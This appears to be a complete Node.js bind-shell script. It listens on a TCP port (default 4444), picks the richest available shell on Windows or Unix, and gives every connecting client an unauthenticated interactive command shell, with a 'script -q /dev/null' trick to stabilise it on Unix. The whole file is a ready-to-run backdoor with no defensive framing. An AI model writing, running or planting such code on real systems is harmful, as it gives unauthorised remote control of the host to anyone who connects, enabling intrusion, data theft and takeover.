const net = require("net");
const process = require("process");
const { spawn } = require("child_process");
const { existsSync } = require("fs");

if(process.argv[2] && +process.argv[2] != process.argv[2]) {
  console.log(`"${process.argv[2]}" is not a valid port. A port must be a number.`);
  process.exit(1);
}

const PORT = process.argv[2] || 4444;

let COMMAND = "/bin/sh";
switch(process.platform) {
  case "win32":
    if(existsSync("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"))
      COMMAND = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    else
      COMMAND = "C:\\Windows\\System32\\cmd.exe";
    break;
  default:
    if(existsSync("/bin/zsh"))
      COMMAND = "/bin/zsh";
    else if(existsSync("/bin/bash"))
      COMMAND = "/bin/bash";
    else if(existsSync("/bin/fish"))
      COMMAND = "/bin/fish";
    else if(existsSync("/bin/dash"))
      COMMAND = "/bin/dash";
    else if(existsSync("/bin/csh"))
      COMMAND = "/bin/csh";
    else if(existsSync("/bin/tcsh"))
      COMMAND = "/bin/tcsh";
    else if(existsSync("/bin/ksh"))
      COMMAND = "/bin/ksh";
    else
      COMMAND = "/bin/sh";
    break;
}


const server = net.createServer(client => {
  client.write(`Shell: ${COMMAND}\n\n`);
  const shell = spawn(COMMAND);
  if(process.platform != "win32") {
    try {
      shell.stdin.write(`SHELL=${COMMAND} script -q /dev/null\n`);
    } catch (e) {
      client.write("Cannot stabilize Linux shell.");
    }
  }
  shell.stdout.pipe(client);
  client.pipe(shell.stdin);
  client.on("end", () => {
    client.destroy();
    process.exit();
  });
});

server.listen(PORT);
